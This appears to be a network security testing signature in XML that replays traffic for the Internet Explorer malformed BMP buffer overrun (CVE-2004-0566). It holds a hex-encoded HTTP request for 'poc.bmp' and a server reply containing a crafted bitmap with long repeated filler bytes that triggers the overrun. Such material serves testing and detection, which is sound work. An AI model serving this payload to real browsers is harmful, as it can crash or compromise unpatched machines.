<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Microsoft Internet Explorer Malformed BMP File Buffer Overrun Vulnerability"/>
    <EngDesc display="true" value="A vulnerability exists in Microsoft Internet Explorer (IE), which could allow a malicious user to execute arbitrary code when a specially crafted bitmap file is loaded by IE."/>
    <Intent display="true"/>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_Microsoft_Internet_Explorer"/>
      <item value="Microsoft_Microsoft_Windows_NT"/>
      <item value="Microsoft_Microsoft_Windows_2000"/>
      <item value="Microsoft_Microsoft_Windows_XP"/>
      <item value="Microsoft_Microsoft_Windows_Server"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_Internet_Explorer_5.01_Service_Pack_2"/>
      <item value="Microsoft_Internet_Explorer_5.01_Service_Pack_3"/>
      <item value="Microsoft_Internet_Explorer_5.01_Service_Pack_4"/>
      <item value="Microsoft_Internet_Explorer_5.5_Service_Pack_2"/>
      <item value="Microsoft_Internet_Explorer_6"/>
      <item value="Microsoft_Internet_Explorer_6_Service_Pack_1"/>
      <item value="Microsoft_Internet_Explorer_6_Service_Pack_1_(64-Bit_Edition)"/>
      <item value="Microsoft_Internet_Explorer_6_for_Windows_Server_2003"/>
      <item value="Microsoft_Internet_Explorer_6_for_Windows_Server_2003_(64-Bit_Edition)"/>
      <item value="Microsoft_Windows_NT_Workstation_4.0_Service_Pack_6a"/>
      <item value="Microsoft_Windows_NT_Server_4.0_Service_Pack_6a"/>
      <item value="Microsoft_Windows_NT_Server_4.0_Terminal_Server_Edition_Service_Pack_6"/>
      <item value="Microsoft_Windows_2000_Service_Pack_2"/>
      <item value="Microsoft_Windows_2000_Service_Pack_3"/>
      <item value="Microsoft_Windows_2000_Service_Pack_4"/>
      <item value="Microsoft_Windows_XP_"/>
      <item value="Microsoft_Windows_XP_Service_Pack_1"/>
      <item value="Microsoft_Windows_XP_64-Bit_Edition_Service_Pack_1"/>
      <item value="Microsoft_Windows_XP_64-Bit_Edition_Version_2003"/>
      <item value="Microsoft_Windows_Server_2003"/>
      <item value="Microsoft_Windows_Server_2003_64-Bit_Edition"/>
    </Known_Versions_Affected>
    <Credit display="true" value="FSC20040217-01"/>
    <CVEID display="true" value="CVE-2004-0566"/>
    <bugtraqID display="true" value="9663"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="ThreatEx Team"/>
    <ID display="true" value="32fb085b4d8871f545fca082c43a24a2"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="True"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value=""/>
    <Authentication display="false" value=""/>
    <ConfImpact display="false" value=""/>
    <IntegImpact display="false" value=""/>
    <AvailImpact display="false" value=""/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value="normal"/>
    <LastModified display="false" value="633610700817812500"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value="B"/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value="1"/>
    <Regex display="false" value=""/>
    <Created value="1213652360" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="M"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="N"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="O"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="P"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Q"/>
  </Variables>
  <Loops>
    <for index="D">
      <for index="M"/>
      <for index="N"/>
      <for index="O"/>
      <for index="P"/>
      <for index="Q"/>
    </for>
    <for index="E"/>
  </Loops>
  <PostScript/>
  <Output index="D" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0124" Identification="4E23" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9546" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="4BBB1A3C" AckNumber="A300FB06" HeaderLength="05" WindowSize="4470" Checksum="14FB" UrgentPointer="0000" Options="" Payload="474554202F706F632E626D7020485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E30290D0A486F73743A2031302E322E312E35300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="E" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="7631" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="6880" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="" destPort="" SeqNumber="A300FB06" AckNumber="4BBB1B38" HeaderLength="05" WindowSize="FF03" Checksum="5DCE" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C2030352041756720323030342031393A35363A303620474D540D0A5365727665723A204170616368652F312E332E3331202857696E333229205048502F342E332E340D0A4C6173742D4D6F6469666965643A205468752C2030352041756720323030342031393A35303A313320474D540D0A455461673A2022302D313364622D3431313238663735220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20353038330D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20696D6167652F626D700D0A0D0A424D305B000000000000EEEEEEEE28000000E10100002E000000010008000000000000000000120B0000120B00000000000000000000360615004C181D0061202500843A2F00903F30006E30230093442E0097472F00F4E5E00064311E00974A2A00994C2C009D4D2E00EEE2DD009A4C29009B4D2B0092492A005A2B130090482300944B26009D4F2900974C2700994E2900B06642007B3E1D009D5026009B4F2500974E24009F512800B6704B00BD8263004F1E00009E52220099512300A0542600723C1C009D5327009F562A0084472300A35A2E00A6603600895434007F5B44008C6B5700DED4CE0058240000A3582300975121009E542400774D3000A96E45009F857400B69A8800672D0000602900008E491500904C180068371200934E1C00985626009D5D2F0094674400AD785100C3AFA000F5F1EE00723400006D31000086420D0A0087430B0087440C0088450E008A4711008C491300A65C1E00B7937500D4C5B9007E3C00007D3C00007C3B00007B3A00007A3900007939000077370000753600007F3D01007E3C01007F3E0200803E0300803F04008140050081410600824107008242080083440D0A0084440B0084450C0085460D0085470E0086481000874A1200884B1300884B1400894D16008B4F19008B501A008C511C008D531E008E541F00AE6827008F56220091592600935C2B00955F2E0097623200996535009B6739009D6A3D009F6E4300A3754A00A5784E00A77B5300AB7F5700AE845E00AA6118007B4A1800A1724500AE651200B0680800B26A0100B7700D0A0094611600B8791F00C9872700D99B4500FCFAF700BB740000B66F0000C17D0000BE790000734C0500BE7D0E00D2942200E1A84100C7850000C5820000C3800000AE740100CA8A0B00C5840B00CE8F0000CB8B0000C9890000C8870000CD8F0B00D99F2100D1930000C98E0000BF860000D59A0D0A00D1960B00D89F1100AF986100D79C0000D3980000CD950000C2961900AD914500C2940000B1840000B08F24008B6C00009E7E0400C8A40000B397060073650000BAAD2A00E3E0BB009D981D00BAB73E007E7D0000A3A12D00BCBB4F0069696800FFFFFE00ACB004008B970000B2BA4D00C2C87800A4B21D00A8B5340079813C00AAB94900B1BE610093AC0300A1AE56008D984D0089A213009AB436006C8B00009DB84400A0B948007299000092B42600AEC46C00FCFDF900749F000079A6020098B84100A1BC54007CAF000076A6000071A100007FB10D0A0097B8470077AE000072A9000075A9000072A6000090B63E0092B8420072AD0000639600007EB3180084B4260088B5320069A80000659E000075B110008AB63B006BAD000098BE60007BB42F008CB94F005DA9000081B740006BB31D004EAE010075B747007AB9550084C0690045B327003EB2210063BA530045B94E0062C171008BD3A50042C37500FFFFFF004A4A4A003535350026262600171717000D0D0D0006060600020202000000000011223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344112233441122334411223344" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
